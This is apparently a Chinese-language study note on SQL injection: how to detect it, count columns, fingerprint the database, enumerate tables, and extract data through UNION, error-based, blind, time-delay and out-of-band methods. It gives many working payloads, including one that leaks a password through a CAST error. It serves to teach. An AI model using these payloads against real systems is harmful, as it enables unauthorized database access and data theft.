    SQL 注入 · 原理与识别¶

    目标：搞清楚「怎么判断有没有注入」「注入到哪一层」「是什么数据库」。 这是所有 payload 的前提 —— 先识别，再攻击。

    一、SQL 注入的本质¶

    应用把用户输入当成「代码」拼进了 SQL 语句。

    $id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = " . $id;   // ← 直接拼接

    正常输入 1 → 查 id=1 的商品。 恶意输入 1 OR 1=1 → 查询变成：

    SELECT * FROM products WHERE id = 1 OR 1=1     -- 返回所有商品

    你的输入改变了 SQL 的「结构」，而不只是「内容」。

    二、注入点的三种形态¶

    ① 字符串型（最常见）¶

    $sql = "SELECT ... WHERE trackingId = '" . $input . "'";

    模板里已经有引号 → 你要先闭合它。

    输入: xxx' AND '1'='1
拼接: WHERE trackingId = 'xxx' AND '1'='1'

    ② 数字型¶

    $sql = "SELECT ... WHERE id = " . $input;      // 没有引号

    不需要闭合引号，直接接条件：

    输入: 1 OR 1=1
拼接: WHERE id = 1 OR 1=1

    ③ 其他位置¶

    位置 例子 特点
    ORDER BY 后 ORDER BY $col 常需用 CASE 构造布尔条件
    LIMIT 后 LIMIT $n 不支持 UNION 时用来盲注
    表名/列名 SELECT $col FROM ... 只能用 information_schema 猜

    三、四种注入技术¶

    技术 适用 特点
    UNION 联合查询 页面回显查询结果 最直接，能一次拿大量数据
    报错注入 页面显示数据库错误 用错误信息「带出」数据
    布尔盲注 页面有内容差异 是/否回答，一次一个 bit
    时间盲注 页面完全无差异 靠响应延迟判断，最慢

    优先级：UNION > 报错 > 布尔 > 时间。 能用快的就别用慢的。

    四、第一步：判断有没有注入¶

    4.1 试单引号¶

    ?id=1'          →  500 / 报错  →  很可能有字符串型注入
?id=1'--        →  200 正常    →  确认可以用注释收尾

    如果加了 ' 没反应，可能是数字型，试：

    ?id=1 AND 1=1      →  正常
?id=1 AND 1=2      →  结果变了 → 有注入

    4.2 判断列数（UNION 前必做）¶

    方法 A：ORDER BY 递增

    ' ORDER BY 1--      →  正常
' ORDER BY 2--      →  正常
' ORDER BY 3--      →  正常
' ORDER BY 4--      →  报错   ← 说明只有 3 列

    方法 B：UNION SELECT NULL

    ' UNION SELECT NULL--              →  报错
' UNION SELECT NULL,NULL--         →  报错
' UNION SELECT NULL,NULL,NULL--    →  正常   ← 3 列

    4.3 找回显列¶

    ' UNION SELECT 'a','b','c'--

    页面上出现哪个字母，哪个位置就回显。 后面把数据放那个位置。

    五、数据库指纹（决定用哪个函数）¶

    不同数据库语法差别很大，先识别再写 payload。

    5.1 版本查询¶

    数据库 payload
    MySQL / MariaDB ' UNION SELECT @@version--
    PostgreSQL ' UNION SELECT version()--
    Oracle ' UNION SELECT banner FROM v$version--
    SQL Server ' UNION SELECT @@version--

    5.2 关键差异表 ⭐¶

    项目 Oracle PostgreSQL MySQL
    取子串 SUBSTR SUBSTRING SUBSTRING
    字符串拼接 \|\| \|\| CONCAT() 或 \|\|
    无表查询 必须 FROM dual 可省略 可省略
    注释 -- -- --（要空格）或 #
    UUID 生成 — — UUID()
    分页 ROWNUM<=n LIMIT n LIMIT n
    当前库 — current_database() database()
    时间延迟 dbms_pipe.receive_message(('a'),10) pg_sleep(10) SLEEP(10)
    制造错误 TO_CHAR(1/0) 1/0 1/0 / EXTRACTVALUE(...)

    5.3 快速判断是不是 Oracle¶

    'and(select 1 from dual)=1--     →  200 → 是 Oracle
                                 →  500 → 不是

    因为 dual 是 Oracle 特有的假表。

    六、六步法（通用流程）¶

    ① 判断注入点        ' 有没有反应 / 数字型用 AND 1=1
② 判断列数          ORDER BY n 递增到报错
③ 找回显列          UNION SELECT 'a','b','c'
④ 识别数据库        版本函数 / dual 测试
⑤ 枚举结构          information_schema（Oracle 用 all_tables/all_tab_columns）
⑥ 读数据            拼回显列 / 盲注

    七、information_schema（拿表名列名的钥匙）¶

    MySQL 和 PostgreSQL 都支持 information_schema：

    列出所有表名¶

    ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

    列出某张表的列名¶

    ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns
  WHERE table_name='users'--

    Oracle 的对应表¶

    -- 表名
SELECT table_name FROM all_tables
-- 列名
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

    ⚠️ Oracle 的表名、列名在系统视图里通常是【全大写】。

    八、什么时候用盲注¶

    页面既不回显查询结果，也不显示数据库错误 → 只能盲注。

    盲注的核心是把「取数据」变成「回答是/否」：

    你问：密码第 1 个字符的 ASCII 码 > 77 吗?
它答：是 / 否

    回答方式分两种：

    类型 你怎么读答案 典型信号
    条件响应 页面内容变化 "Welcome back" 出现/消失
    条件错误 HTTP 状态码变化 500 / 200
    时间延迟 响应耗时 延迟 5 秒 = 真

    详细盲注技巧见 02-payload速查.md。

    九、必须记住的三条铁律¶

    ① 引号必须配对（算上应用补的那个）¶

    你写 1 个开引号 → 应用补 1 个闭引号 → 平衡
你写 2 个引号   → 应用补 1 个      → 不平衡 → 报错

    所以要么靠应用补，要么自己用 -- 把多余的注释掉。

    ② 括号必须配对¶

    WHEN (A AND B) THEN      ← 这里的括号要自己补全
WHEN SUBSTR(...)>'m' THEN ← 或者干脆不用括号

    ③ 标点必须是半角¶

    ,  (  )  ;  '  "  \        全部用英文输入法

    十、第四种注入：可见错误（Verbose Errors）¶

    有些应用会把数据库的完整报错直接显示在页面上。

    Unterminated string literal started at position 52
in SQL SELECT * FROM tracking WHERE id = '''. Expected char

    一条报错同时告诉你三件事：

    信息 从哪看
    查询结构 WHERE id = '...'
    表名 tracking
    注入类型 三个引号 → 字符串型，模板补了一个收尾引号

    三种利用方式¶

    ① 直接读错误里的数据

    ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

    → 报错 invalid input syntax for type integer: "s3cr3t" —— 密码就在报错里。

    ② 用报错定位语法问题

    报错会指出位置：position 97 落在 'administrator' 中间 → 说明查询在那里被截断了（不是你的引号写错）。

    ③ 用报错确认结构

    ORDER BY 超出列数、UNION 列数不匹配 —— 报错都会直接告诉你。

    关键：CAST 就是数据通道¶

    CAST('abc' AS int)   →  报错：invalid input syntax for type integer: "abc"

    数据库会把"转换失败的原始值"原样打印出来 —— 这就是外泄通道。

    四数据库的等价写法见 02-payload速查.md 第十二节。

    十一、第五种注入：带外（OOB，Out-of-Band）¶

    当页面无差异、不能延时、连错误都看不到时，最后一条路：让数据库「主动联系你」。

    你注入 → 数据库把数据拼进域名 → 发起 DNS 查询 → 你在自己的平台看到
    漏洞 OOB 用法
    SQL 注入 xmltype / xp_dirtree / COPY TO PROGRAM
    XXE 外部实体指向你的域名
    SSRF 直接请求你的域名
    命令注入 curl / nslookup / ping 你的域名

    核心限制：

    限制 数值
    DNS 单个标签 ≤ 63 字符
    允许字符 a-z 0-9 -（大写、_、. 要转码）

    完整方法、四库 payload、平台选择见 06-OOB带外注入.md。

    十二、一句话总结¶

    SQL 注入 = 让你的输入从「数据」变成「代码」。 关键是找到那个能「闭合」的字符（通常是 '），然后用注释 -- 收拾残局。 不同数据库语法不同 —— 先识别，再动手。 读不到回显时依次尝试：条件响应 → 条件错误 → 时间延迟 → 带外。
